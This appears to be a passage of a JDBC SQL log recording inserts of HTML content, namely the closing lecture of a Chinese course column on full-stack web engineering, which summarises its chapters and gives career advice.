data-slate-string="true">最后则是数据持久层的设计，包括理论部分、关系数据库和非关系数据库的一些设计要点；以及实例部分，包括几个范例系统：搜索引擎、地理信息系统和电商网站。</span></span></span> 
</div> <h3 class="se-4688dd01" data-slate-type="heading" data-slate-object="block" data-key="988"><span 
data-slate-object="text" data-key="989"><span data-slate-leaf="true" data-offset-key="989:0" 
data-first-offset="true"><span data-slate-string="true">第五章：寻找最佳实践</span></span></span></h3> 
<div class="se-a9c3f076 " data-slate-type="paragraph" data-slate-object="block" data-key="990"> 
<span data-slate-object="text" data-key="991"><span data-slate-leaf="true" data-offset-key="991:0" 
data-first-offset="true"><span data-slate-string="true">在第五章中，我们跳出了全栈技术纵深方向上具体某一层的限制，而是从一个横向的角度去分析相关的实践技术。</span></span></span> 
</div> <div class="se-ff8dfc10 " data-slate-type="paragraph" data-slate-object="block" data-key="992"> 
<span data-slate-object="text" data-key="993"><span data-slate-leaf="true" data-offset-key="993:0" 
data-first-offset="true"><span data-slate-string="true">在 Ops 三部曲中，我分别介绍了：</span></span></span> 
</div> <div class="se-e2b2268d" data-slate-type="list" data-slate-object="block" data-key="994"> 
<div class="se-e673f0a4 se-14e1ba7a" data-slate-type="list-line" data-slate-object="block" 
data-key="995"> <span data-slate-object="text" data-key="996"><span data-slate-leaf="true" 
data-offset-key="996:0" data-first-offset="true"><span data-slate-string="true">配置管理，有哪些配置管理的技术，我们该选择怎样的方式去做配置管理；</span></span></span> 
</div> <div class="se-14cc6eaf se-00479ed7" data-slate-type="list-line" data-slate-object="block" 
data-key="997"> <span data-slate-object="text" data-key="998"><span data-slate-leaf="true" 
data-offset-key="998:0" data-first-offset="true"><span data-slate-string="true">集群部署，我介绍了集群部署的方式，部署下的负载分担原理和策略算法，以及集群部署下常见的话题——Session 
和 Cookie；</span></span></span> </div> <div class="se-2e10591e se-671b3fc9" data-slate-type="list-line" 
data-slate-object="block" data-key="999"> <span data-slate-object="text" data-key="1000"><span 
data-slate-leaf="true" data-offset-key="1000:0" data-first-offset="true"><span data-slate-string="true">测试和发布，围绕 
CI/CD 介绍了 pipeline 的含义、内容和挑战，以及不同类型的测试在其上集成的方式。</span></span></span> </div> </div> <div class="se-3c82a969 
" data-slate-type="paragraph" data-slate-object="block" data-key="1001"> <span data-slate-object="text" 
data-key="1002"><span data-slate-leaf="true" data-offset-key="1002:0" data-first-offset="true"><span 
data-slate-string="true">在网络安全那一讲中，我着重介绍了常见的 Web 攻击方式的原理，包括 XSS、CSRF、SQL 注入、HTTP 和 DNS 劫持，以及 
DDoS。</span></span></span> </div> <div class="se-74eb6730 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1003"> <span data-slate-object="text" data-key="1004"><span data-slate-leaf="true" 
data-offset-key="1004:0" data-first-offset="true"><span data-slate-string="true">最后则是 SEO 这一讲，我介绍了 
SEO 和白帽、黑帽的含义，以及一些常见的 SEO 技术，包括站内优化和站外优化。</span></span></span> </div> <h3 class="se-f171329f" 
data-slate-type="heading" data-slate-object="block" data-key="1005"><span data-slate-object="text" 
data-key="1006"><span data-slate-leaf="true" data-offset-key="1006:0" data-first-offset="true"><span 
data-slate-string="true">第六章：专题</span></span></span></h3> <div class="se-35737743 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1007"> <span data-slate-object="text" data-key="1008"><span 
data-slate-leaf="true" data-offset-key="1008:0" data-first-offset="true"><span data-slate-string="true">在第六章，我选取了四大专题分别展开介绍。</span></span></span> 
</div> <div class="se-acba53a6 " data-slate-type="paragraph" data-slate-object="block" data-key="1009"> 
<span data-slate-object="text" data-key="1010"><span data-slate-leaf="true" data-offset-key="1010:0" 
data-first-offset="true"><span data-slate-string="true">在网站性能优化一讲，首先我介绍了一些基础知识，包括性能优化和软件设计的关系，性能优化的关注点，性能测试和指标，以及寻找性能瓶颈的思路；接着按照产品架构调整、后端和持久层优化，以及前端和网络层优化这样三个部分，分别介绍相应的常见性能优化技术。</span></span></span> 
</div> <div class="se-f3034b0c " data-slate-type="paragraph" data-slate-object="block" data-key="1011"> 
<span data-slate-object="text" data-key="1012"><span data-slate-leaf="true" data-offset-key="1012:0" 
data-first-offset="true"><span data-slate-string="true">在全栈开发中的算法这一讲，我以这样几大场景为主线，介绍了一些重要的算法：</span></span></span> 
</div> <div class="se-a41ce5dd" data-slate-type="list" data-slate-object="block" data-key="1013"> 
<div class="se-fe7ed91f se-9d677a7b" data-slate-type="list-line" data-slate-object="block" 
data-key="1014"> <span data-slate-object="text" data-key="1015"><span data-slate-leaf="true" 
data-offset-key="1015:0" data-first-offset="true"><span data-slate-string="true">流量控制算法，包括基于固定时间窗口和滑动时间窗口的流量控制，漏桶算法和令牌桶算法；</span></span></span> 
</div> <div class="se-00e5b583 se-771effbd" data-slate-type="list-line" data-slate-object="block" 
data-key="1016"> <span data-slate-object="text" data-key="1017"><span data-slate-leaf="true" 
data-offset-key="1017:0" data-first-offset="true"><span data-slate-string="true">Diffie–Hellman 
密钥交换算法，从中我们学到了数学上超大质数在安全领域的一个典型应用；</span></span></span> </div> <div class="se-ee8af567 se-9571a9e2" 
data-slate-type="list-line" data-slate-object="block" data-key="1018"> <span data-slate-object="text" 
data-key="1019"><span data-slate-leaf="true" data-offset-key="1019:0" data-first-offset="true"><span 
data-slate-string="true">数据压缩算法，包括哈夫曼编码、RLE 编码和算术编码，从而帮助我们理解，如今繁多的压缩技术的最基本的原理。</span></span></span> 
</div> </div> <div class="se-7093b0ec " data-slate-type="paragraph" data-slate-object="block" 
data-key="1020"> <span data-slate-object="text" data-key="1021"><span data-slate-leaf="true" 
data-offset-key="1021:0" data-first-offset="true"><span data-slate-string="true">在分页这一讲中，我讲了分页的分类和几种实现分页的技术，最后则是分页的常见问题——重复数据，它背后可能的原因和相应的解决方案。</span></span></span> 
</div> <div class="se-96b37b4e " data-slate-type="paragraph" data-slate-object="block" data-key="1022"> 
<span data-slate-object="text" data-key="1023"><span data-slate-leaf="true" data-offset-key="1023:0" 
data-first-offset="true"><span data-slate-string="true">在最后的 XML、JSON 和 YAML 这一讲，我把这几个数据承载格式的优劣进行了仔细的比较，包括简洁和严谨的程度，与 
JavaScript 的亲和力，schema、转义方式和路径表达式等等。</span></span></span> </div> <h3 class="se-f9868207" data-slate-type="heading" 
data-slate-object="block" data-key="1024"><span data-slate-object="text" data-key="1025"><span 
data-slate-leaf="true" data-offset-key="1025:0" data-first-offset="true"><span data-slate-string="true">其它</span></span></span></h3> 
<div class="se-522f870c " data-slate-type="paragraph" data-slate-object="block" data-key="1026"> 
<span data-slate-object="text" data-key="1027"><span data-slate-leaf="true" data-offset-key="1027:0" 
data-first-offset="true"><span data-slate-string="true">以上是技术方面的“硬通货”，对于非技术方面，我通过特别放送等等的形式，讨论了一些我认为比较重要，尤其是对于 
Web 全栈工程师来说比较重要的话题。</span></span></span> </div> <div class="se-5514c9f0" data-slate-type="list" 
data-slate-object="block" data-key="1028"> <div class="se-acc1206e se-9b366da8" data-slate-type="list-line" 
data-slate-object="block" data-key="1029"> <span data-slate-object="text" data-key="1030"><span 
data-slate-leaf="true" data-offset-key="1030:0" data-first-offset="true"><span data-slate-string="true">怎样去理解 
Web 全栈技术，全栈技术应该怎样学习，需要遵从怎样的学习策略；</span></span></span> </div> <div class="se-1cc2d59d se-cc136f77" 
data-slate-type="list-line" data-slate-object="block" data-key="1031"> <span data-slate-object="text" 
data-key="1032"><span data-slate-leaf="true" data-offset-key="1032:0" data-first-offset="true"><span 
data-slate-string="true">北美全栈工程师的招聘，招人会秉持怎样的理念，整个流程是怎样的；</span></span></span> </div> <div class="se-a09c6af4 
se-62cddb5e" data-slate-type="list-line" data-slate-object="block" data-key="1033"> <span data-slate-object="text" 
data-key="1034"><span data-slate-leaf="true" data-offset-key="1034:0" data-first-offset="true"><span 
data-slate-string="true">技术修炼应该怎样进行取舍和选择，哪些技术应该深挖，哪些则可以点到即止；</span></span></span> </div> <div 
class="se-2a5cc4e9 se-bc442791" data-slate-type="list-line" data-slate-object="block" data-key="1035"> 
<span data-slate-object="text" data-key="1036"><span data-slate-leaf="true" data-offset-key="1036:0" 
data-first-offset="true"><span data-slate-string="true">全栈团队的构成一般是怎样的，有哪些重要的角色；</span></span></span> 
</div> <div class="se-a8549dc1 se-ec9d37f4" data-slate-type="list-line" data-slate-object="block" 
data-key="1037"> <span data-slate-object="text" data-key="1038"><span data-slate-leaf="true" 
data-offset-key="1038:0" data-first-offset="true"><span data-slate-string="true">代码审查为什么不可或缺，有哪些争议和好处，又有哪些技巧；</span></span></span> 
</div> <div class="se-b85846fc se-3fc8908e" data-slate-type="list-line" data-slate-object="block" 
data-key="1039"> <span data-slate-object="text" data-key="1040"><span data-slate-leaf="true" 
data-offset-key="1040:0" data-first-offset="true"><span data-slate-string="true">程序员为什么要学英语，重要性在哪里，又有哪些好办法；</span></span></span> 
</div> <div class="se-e86a0ac9 se-8b4943ad" data-slate-type="list-line" data-slate-object="block" 
data-key="1041"> <span data-slate-object="text" data-key="1042"><span data-slate-leaf="true" 
data-offset-key="1042:0" data-first-offset="true"><span data-slate-string="true">作为 Web 全栈工程师，我们还有哪些发展方向可以考虑，我们为什么需要让项目和团队也“全栈化”？</span></span></span> 
</div> </div> <h2 class="se-968e7cd7" data-slate-type="heading" data-slate-object="block" data-key="1043"><span 
data-slate-object="text" data-key="1044"><span data-slate-leaf="true" data-offset-key="1044:0" 
data-first-offset="true"><span data-slate-string="true">继续提升的重要两步</span></span></span></h2> 
<div class="se-100836cc " data-slate-type="paragraph" data-slate-object="block" data-key="1045"> 
<span data-slate-object="text" data-key="1046"><span data-slate-leaf="true" data-offset-key="1046:0" 
data-first-offset="true"><span data-slate-string="true">对于我们专栏已经覆盖到的这些技能树的枝枝丫丫，我还想特别强调两个方面，这两个方面其实我们已经谈到过了，但是我觉得在今天，我们需要再拿出来稍稍强化一下。因为在我看来，它们有些特殊——它们对于程序员进一步发展至关重要，它们也是“成为更好的全栈工程师”所必须迈出的两步，但是谈论的人却很少。</span></span></span> 
</div> <h3 class="se-025c273f" data-slate-type="heading" data-slate-object="block" data-key="1047"><span 
data-slate-object="text" data-key="1048"><span data-slate-leaf="true" data-offset-key="1048:0" 
data-first-offset="true"><span data-slate-string="true">1. 从做项目到做产品</span></span></span></h3> 
<div class="se-73e5bd13 " data-slate-type="paragraph" data-slate-object="block" data-key="1049"> 
<span data-slate-object="text" data-key="1050"><span data-slate-leaf="true" data-offset-key="1050:0" 
data-first-offset="true"><span data-slate-string="true">你还记得吗？ </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1051" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="1052"><span data-slate-leaf="true" data-offset-key="1052:0" data-first-offset="true"><span 
data-slate-string="true">[第 28 讲]</span></span></span></a><span data-slate-object="text" data-key="1053"><span 
data-slate-leaf="true" data-offset-key="1053:0" data-first-offset="true"><span data-slate-string="true"> 
的选修课堂，我介绍了程序员独立性的几个阶段，不知道你属于哪一个阶段呢？作为职业生涯进阶的一部分，如果你还停留在“做项目”的阶段，那么你需要在某一天切换到“做产品”的模式上来，完成程序员独立性的升级。事实上，“做项目”，终归只是“做产品”整个过程中很小的一部分，只有对于产品多个阶段的不断地迭代、回馈，程序员很多方面的认识才能不断进化。</span></span></span> 
</div> <div class="se-f6eeb795 " data-slate-type="paragraph" data-slate-object="block" data-key="1054"> 
<span data-slate-object="text" data-key="1055"><span data-slate-leaf="true" data-offset-key="1055:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，对于程序员来说，oncall（定位和修复线上问题）就是“做产品”必经的一环，也是团队“吃自己的狗食”的重要一环。这个过程可以反哺开发阶段，没有这样的过程，就不会真正体会到代码质量的重要性，就不会彻底意识到单元测试的重要性，也不会对代码评审的必要性有深刻的认识。</span></span></span> 
</div> <div class="se-88a38031 " data-slate-type="paragraph" data-slate-object="block" data-key="1056"> 
<span data-slate-object="text" data-key="1057"><span data-slate-leaf="true" data-offset-key="1057:0" 
data-first-offset="true"><span data-slate-string="true">因此，如果你还只有“做项目”的经验，我建议你，在未来给自己寻找做产品的机会。</span></span></span> 
</div> <h3 class="se-7305d892" data-slate-type="heading" data-slate-object="block" data-key="1058"><span 
data-slate-object="text" data-key="1059"><span data-slate-leaf="true" data-offset-key="1059:0" 
data-first-offset="true"><span data-slate-string="true">2. 保持技术上的包容心</span></span></span></h3> 
<div class="se-02fdc4c7 " data-slate-type="paragraph" data-slate-object="block" data-key="1060"> 
<span data-slate-object="text" data-key="1061"><span data-slate-leaf="true" data-offset-key="1061:0" 
data-first-offset="true"><span data-slate-string="true">在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="1062" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="1063"><span data-slate-leaf="true" data-offset-key="1063:0" data-first-offset="true"><span 
data-slate-string="true">[第 14 讲]</span></span></span></a><span data-slate-object="text" data-key="1064"><span 
data-slate-leaf="true" data-offset-key="1064:0" data-first-offset="true"><span data-slate-string="true"> 
我就谈到过这个给自己“贴标签”的问题，有些程序员工作没几年，无论是有意识还是无意识地，就已经给自己贴上了过于明确的技术分类的标签。</span></span></span> </div> 
<div class="se-9e772ca3 " data-slate-type="paragraph" data-slate-object="block" data-key="1065"> 
<span data-slate-object="text" data-key="1066"><span data-slate-leaf="true" data-offset-key="1066:0" 
data-first-offset="true"><span data-slate-string="true">比如说，给自己贴上“PHP 工程师”的标签，理由是觉得 PHP 是最好的语言，因此求职的时候非 
PHP 的岗位一概不考虑；比如，只想做 Billing 系统，其它的业务领域和项目一概不考虑；再比如，极度强调自己是“技术人”，而特别排斥管理技巧、沟通合作能力等这些被鄙视为“非干货”、“非实战”的内容，可是对于几乎所有的职业生涯技术路线来说，它们其实都是非常重要，且绕不开的槛。</span></span></span> 
</div> <div class="se-4bda2846 " data-slate-type="paragraph" data-slate-object="block" data-key="1067"> 
<span data-slate-object="text" data-key="1068"><span data-slate-leaf="true" data-offset-key="1068:0" 
data-first-offset="true"><span data-slate-string="true">再说说具体的技术，每个人都有偏好，但是不要因为自己的偏好，在技术的选择上失去程序员应有的理性判断，甚至将应当去接纳和学习的技术拒之门外。因为你也不知道哪一天，一个新领域、一门新技术会像浪潮一样涌来，就像几年前的云计算，这两年的区块链。只有那些有着包容心的程序员，才能去接纳和抓住机会。这也正如我在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="1069" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="1070"><span data-slate-leaf="true" data-offset-key="1070:0" 
data-first-offset="true"><span data-slate-string="true">[开篇词]</span></span></span></a><span 
data-slate-object="text" data-key="1071"><span data-slate-leaf="true" data-offset-key="1071:0" 
data-first-offset="true"><span data-slate-string="true"> 中所说的，最终也许我们需要“学得精”，但是一开始我们一定要“学得杂”。</span></span></span> 
</div> <h2 class="se-738cea3a" data-slate-type="heading" data-slate-object="block" data-key="1072"><span 
data-slate-object="text" data-key="1073"><span data-slate-leaf="true" data-offset-key="1073:0" 
data-first-offset="true"><span data-slate-string="true">送君千里，终须一别</span></span></span></h2> 
<div class="se-2a3e61a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1074"> 
<span data-slate-object="text" data-key="1075"><span data-slate-leaf="true" data-offset-key="1075:0" 
data-first-offset="true"><span data-slate-string="true">任何一段旅程都有终点，这个专栏也不例外。</span></span></span> 
</div> <div class="se-6fe3f139 " data-slate-type="paragraph" data-slate-object="block" data-key="1076"> 
<span data-slate-object="text" data-key="1077"><span data-slate-leaf="true" data-offset-key="1077:0" 
data-first-offset="true"><span data-slate-string="true">今天，你学到了这里，我最想大声地和你说一句话——祝贺你！从试读到购买，再到完整学习，我相信你已经一马当先，击败了一些人。现在，我希望你可以继续一马当先，不止在这个专栏，还在你今后的学习、工作和生活中。</span></span></span> 
</div> <div class="se-43602414 " data-slate-type="paragraph" data-slate-object="block" data-key="1078"> 
<span data-slate-object="text" data-key="1079"><span data-slate-leaf="true" data-offset-key="1079:0" 
data-first-offset="true"><span data-slate-string="true">回头看，整个专栏正文部分共计 40 讲，全部加起来有二十多万字。如果在一开始写专栏的时候跟我说，我会做到这个程度，我一定不相信。在这个过程当中，从主题选择、大纲确定、内容试写，到正式写作、绘图、审校、录音，整个过程确实让我颇为疲惫。一篇文章耗时最长的部分并非写作，而是内容选择和构思，比如怎样让你的收获最大化，得到更加通用的原理、套路 
，而不是停留在某个单一的技术表面上。但是，就像我在专栏上线以前想的那样，我觉得这是一件自己可以尽量认真做好的、很有意义的事情。现在看起来，我觉得可以稍微松口气了。</span></span></span> 
</div> <div class="se-006c2d3e " data-slate-type="paragraph" data-slate-object="block" data-key="1080"> 
<span data-slate-object="text" data-key="1081"><span data-slate-leaf="true" data-offset-key="1081:0" 
data-first-offset="true"><span data-slate-string="true">在这里，我要说，感谢你可以阅读这个专栏，并且特别感谢那些积极在留言区交流的朋友，关于全栈的内容，我们还可以继续在留言区沟通，也欢迎你访问我的</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1082" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="1083"><span data-slate-leaf="true" data-offset-key="1083:0" 
data-first-offset="true"><span data-slate-string="true">个人博客</span></span></span></a><span 
data-slate-object="text" data-key="1084"><span data-slate-leaf="true" data-offset-key="1084:0" 
data-first-offset="true"><span data-slate-string="true">，和我继续交流。</span></span></span> </div> 
<div class="se-a6a94ca4 " data-slate-type="paragraph" data-slate-object="block" data-key="1085"> 
<span data-slate-object="text" data-key="1086"><span data-slate-leaf="true" data-offset-key="1086:0" 
data-first-offset="true"><span data-slate-string="true">世界变化太快，技术发展太快，我们“被迫”成为了全栈工程师。</span></span></span> 
</div> <div class="se-86221bdc " data-slate-type="paragraph" data-slate-object="block" data-key="1087"> 
<span data-slate-object="text" data-key="1088"><span data-slate-leaf="true" data-offset-key="1088:0" 
data-first-offset="true"><span class="se-743dcd75" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">全栈，不只是一种技术分类，还代表了一种态度：理性、包容、好学。</span></span></span></span><span data-slate-object="text" 
data-key="1089"><span data-slate-leaf="true" data-offset-key="1089:0" data-first-offset="true"><span 
data-slate-string="true">希望你可以从这个专栏得到你想要的，但更多的收获，需要你在线下继续努力。毕竟，《全栈工程师修炼指南》这个专栏结束了，而你的全栈之路却才刚刚开始。</span></span></span> 
</div> <div class="se-1b9ef6e9 " data-slate-type="paragraph" data-slate-object="block" data-key="1090"> 
<span data-slate-object="text" data-key="1091"><span data-slate-leaf="true" data-offset-key="1091:0" 
data-first-offset="true"><span data-slate-string="true">好，我是四火，我们后会有期！</span></span></span> 
</div> <div class="se-429fd270 " data-slate-type="paragraph" data-slate-object="block" data-key="1092"> 
<span data-slate-object="text" data-key="1093"><span data-slate-leaf="true" data-offset-key="1093:0" 
data-first-offset="true"><span class="se-7e735c66" data-slate-type="primary" data-slate-object="mark"><span 
data-slate-string="true">最后，文末有一份调查问卷，希望你可以抽出两分钟的时间填写一下。我会认真倾听你对这个专栏的意见或者建议，期待你的反馈！</span></span></span></span> 
</div> <div class="se-ae26b95d" data-slate-type="image" data-slate-object="block" data-key="1094"> 
<a href="https://jinshuju.net/f/514fSy"><img class="se-c1613d83" src="https://static001.geekbang.org/resource/image/3f/3d/3f7b46f38bc0603c33fb4bf299d6763d.jpg"></a> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 3, 3) 
 {executed in 4 msec}
2020-11-19 11:00:26.461 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=3 
 {executed in 1 msec}
2020-11-19 11:00:26.461 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.469 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="928" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-5b3bdcd9 " data-slate-type="paragraph" data-slate-object="block" data-key="929"> 
<span data-slate-object="text" data-key="930"><span data-slate-leaf="true" data-offset-key="930:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-d5bb7d18 " data-slate-type="paragraph" data-slate-object="block" data-key="931"> 
<span data-slate-object="text" data-key="932"><span data-slate-leaf="true" data-offset-key="932:0" 
data-first-offset="true"><span data-slate-string="true">这是这个专栏的最后一讲了。</span></span></span> 
</div> <h2 class="se-5fcad9b1" data-slate-type="heading" data-slate-object="block" data-key="933"><span 
data-slate-object="text" data-key="934"><span data-slate-leaf="true" data-offset-key="934:0" 
data-first-offset="true"><span data-slate-string="true">回顾一下，我们学到了什么？</span></span></span></h2> 
<div class="se-eb31d66e " data-slate-type="paragraph" data-slate-object="block" data-key="935"> 
<span data-slate-object="text" data-key="936"><span data-slate-leaf="true" data-offset-key="936:0" 
data-first-offset="true"><span data-slate-string="true">现在，是时候来回顾一下我们学过的 Web 全栈树了。这里我按章节进行划分，把每一讲的标题和主要内容做成了一张思维导图，帮助你回顾。</span></span></span> 
</div> <div class="se-b9e7b880" data-slate-type="image" data-slate-object="block" data-key="937"> 
<img class="se-4334ba90" src="https://static001.geekbang.org/resource/image/29/4a/2961de2a299d887fefa7731dc8d28a4a.png"> 
</div> <div class="se-f0bd987b " data-slate-type="paragraph" data-slate-object="block" data-key="938"> 
<span data-slate-object="text" data-key="939"><span data-slate-leaf="true" data-offset-key="939:0" 
data-first-offset="true"><span data-slate-string="true">下面我把它展开来，你可以顺着这个展开的内容，回顾自己所学。</span></span></span> 
</div> <h3 class="se-3ded67bd" data-slate-type="heading" data-slate-object="block" data-key="940"><span 
data-slate-object="text" data-key="941"><span data-slate-leaf="true" data-offset-key="941:0" 
data-first-offset="true"><span data-slate-string="true">第一章：网络协议和 Web 接口</span></span></span></h3> 
<div class="se-b11b2856 " data-slate-type="paragraph" data-slate-object="block" data-key="942"> 
<span data-slate-object="text" data-key="943"><span data-slate-leaf="true" data-offset-key="943:0" 
data-first-offset="true"><span data-slate-string="true">第一章是网络协议和 Web 接口，我以 HTTP 为核心，介绍了它的演进历史、相关技术，以及它的局限性：</span></span></span> 
</div> <div class="se-0da04aaf" data-slate-type="list" data-slate-object="block" data-key="944"> 
<div class="se-b5582af6 se-4b5d5342" data-slate-type="list-line" data-slate-object="block" 
data-key="945"> <span data-slate-object="text" data-key="946"><span data-slate-leaf="true" 
data-offset-key="946:0" data-first-offset="true"><span data-slate-string="true">对于安全传输方面的局限，我介绍了 
HTTPS 的原理；</span></span></span> </div> <div class="se-807c7aab se-9ac48236" data-slate-type="list-line" 
data-slate-object="block" data-key="947"> <span data-slate-object="text" data-key="948"><span 
data-slate-leaf="true" data-offset-key="948:0" data-first-offset="true"><span data-slate-string="true">对于交互模式上的局限，我介绍了一些服务端推送技术；</span></span></span> 
</div> <div class="se-1f2e4218 se-57540395" data-slate-type="list-line" data-slate-object="block" 
data-key="949"> <span data-slate-object="text" data-key="950"><span data-slate-leaf="true" 
data-offset-key="950:0" data-first-offset="true"><span data-slate-string="true">对于无状态连接的局限，在第五章我介绍了客户端和服务端的会话。</span></span></span> 
</div> </div> <div class="se-c4f6f7b9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="951"> <span data-slate-object="text" data-key="952"><span data-slate-leaf="true" 
data-offset-key="952:0" data-first-offset="true"><span data-slate-string="true">也是从这一章开始，我们开始接触了 
push 和 pull 这两个“对立”的套路，对于整个专栏，我们在各个层面的技术中把它们拿出来反复比较，权衡利弊。</span></span></span> </div> <div 
class="se-f29e43b1 " data-slate-type="paragraph" data-slate-object="block" data-key="953"> 
<span data-slate-object="text" data-key="954"><span data-slate-leaf="true" data-offset-key="954:0" 
data-first-offset="true"><span data-slate-string="true">对于 Web 接口部分，我从 SOAP 和 REST 所代表的两大设计风格开始，梳理了 
Web 接口设计的过程，以及需要考虑的零零总总各个方面。</span></span></span> </div> <h3 class="se-77b435fe" data-slate-type="heading" 
data-slate-object="block" data-key="955"><span data-slate-object="text" data-key="956"><span 
data-slate-leaf="true" data-offset-key="956:0" data-first-offset="true"><span data-slate-string="true">第二章：欢迎来到 
MVC 的世界</span></span></span></h3> <div class="se-e16f3a5d " data-slate-type="paragraph" data-slate-object="block" 
data-key="957"> <span data-slate-object="text" data-key="958"><span data-slate-leaf="true" 
data-offset-key="958:0" data-first-offset="true"><span data-slate-string="true">第二章我主要针对 MVC 
这个对于网站和其它 Web 应用开发来说，最重要的架构和设计模式，介绍演进、分层，并逐层仔细深挖：</span></span></span> </div> <div class="se-bf3c628f" 
data-slate-type="list" data-slate-object="block" data-key="959"> <div class="se-01817fd3 se-25892bc2" 
data-slate-type="list-line" data-slate-object="block" data-key="960"> <span data-slate-object="text" 
data-key="961"><span data-slate-leaf="true" data-offset-key="961:0" data-first-offset="true"><span 
data-slate-string="true">模型层，我介绍了贫血模型和充血模型，以及常见的 CQRS 模式；</span></span></span> </div> <div 
class="se-471c6b55 se-97ca79bc" data-slate-type="list-line" data-slate-object="block" data-key="962"> 
<span data-slate-object="text" data-key="963"><span data-slate-leaf="true" data-offset-key="963:0" 
data-first-offset="true"><span data-slate-string="true">视图层，页面聚合是我们的重点，包括客户端聚合和服务端聚合，特别是模板引擎的工作原理；</span></span></span> 
</div> <div class="se-4c30cf6e se-db31c0d4" data-slate-type="list-line" data-slate-object="block" 
data-key="964"> <span data-slate-object="text" data-key="965"><span data-slate-leaf="true" 
data-offset-key="965:0" data-first-offset="true"><span data-slate-string="true">控制器层，我把这一层拆分为几个方面，梳理了控制器在 
MVC 架构中的工作步骤。</span></span></span> </div> </div> <div class="se-7866cb7a " data-slate-type="paragraph" 
data-slate-object="block" data-key="966"> <span data-slate-object="text" data-key="967"><span 
data-slate-leaf="true" data-offset-key="967:0" data-first-offset="true"><span data-slate-string="true">之后我们将 
MVC 泛化，了解了其它重要的设计模式和套路，包括 AOP 和 IoC，以及实现切面编程所需的代理技术；还有其它著名的 JavaEE 模式，特别是拦截过滤器和数据访问对象模式。</span></span></span> 
</div> <h3 class="se-6733a337" data-slate-type="heading" data-slate-object="block" data-key="968"><span 
data-slate-object="text" data-key="969"><span data-slate-leaf="true" data-offset-key="969:0" 
data-first-offset="true"><span data-slate-string="true">第三章：从后端到前端</span></span></span></h3> 
<div class="se-00b38802 " data-slate-type="paragraph" data-slate-object="block" data-key="970"> 
<span data-slate-object="text" data-key="971"><span data-slate-leaf="true" data-offset-key="971:0" 
data-first-offset="true"><span data-slate-string="true">第三章主要讲前端技术。首先我从一个大体上俯瞰的角度，阐述了我所理解的前端技术的“不同”，特别是思维模式的不同。</span></span></span> 
</div> <div class="se-73606031 " data-slate-type="paragraph" data-slate-object="block" data-key="972"> 
<span data-slate-object="text" data-key="973"><span data-slate-leaf="true" data-offset-key="973:0" 
data-first-offset="true"><span data-slate-string="true">然后我介绍了一些前端技术重要的知识点，比如 JavaScript 面向对象，包括封装、继承和多态的实现方式，也包括对象创建的原理。接着我以 
React 和 Angular，以及它们的重要特性为例，介绍了百花齐放的前端 MVC 框架为我们带来的变革。</span></span></span> </div> <div class="se-0d6ef2c8 
" data-slate-type="paragraph" data-slate-object="block" data-key="974"> <span data-slate-object="text" 
data-key="975"><span data-slate-leaf="true" data-offset-key="975:0" data-first-offset="true"><span 
data-slate-string="true">在页面设计和交互布局一讲中，我使用实际例子介绍了页面设计方面的一些原则和思路，包括渐进增强和优雅降级等等。</span></span></span> 
</div> <div class="se-b064b7e6 " data-slate-type="paragraph" data-slate-object="block" data-key="976"> 
<span data-slate-object="text" data-key="977"><span data-slate-leaf="true" data-offset-key="977:0" 
data-first-offset="true"><span data-slate-string="true">接着在数据可视化一讲中，我仔细比较了当今最重要的两种 Web 绘图标准，SVG 
和 Canvas，并介绍了 Flot 和 D3.js 这两个可视化的库。</span></span></span> </div> <div class="se-71622bf5 " 
data-slate-type="paragraph" data-slate-object="block" data-key="978"> <span data-slate-object="text" 
data-key="979"><span data-slate-leaf="true" data-offset-key="979:0" data-first-offset="true"><span 
data-slate-string="true">最后是 JavaScript 异步编程的技术，我们重新回归 JavaScript，我梳理了最重要的几个技术要点，这也是这一章相对比较难的一讲。</span></span></span> 
</div> <h3 class="se-007fa24e" data-slate-type="heading" data-slate-object="block" data-key="980"><span 
data-slate-object="text" data-key="981"><span data-slate-leaf="true" data-offset-key="981:0" 
data-first-offset="true"><span data-slate-string="true">第四章：数据持久化</span></span></span></h3> 
<div class="se-86711bed " data-slate-type="paragraph" data-slate-object="block" data-key="982"> 
<span data-slate-object="text" data-key="983"><span data-slate-leaf="true" data-offset-key="983:0" 
data-first-offset="true"><span data-slate-string="true">继续往技术栈的下方挖，数据持久化。在这一章的一开始，我首先介绍了这一层中互联网应用最广泛的技术之一——缓存，讲了它的本质、应用和常见的坑，以及缓存框架的设计要点。</span></span></span> 
</div> <div class="se-d8f08ed0 " data-slate-type="paragraph" data-slate-object="block" data-key="984"> 
<span data-slate-object="text" data-key="985"><span data-slate-leaf="true" data-offset-key="985:0" 
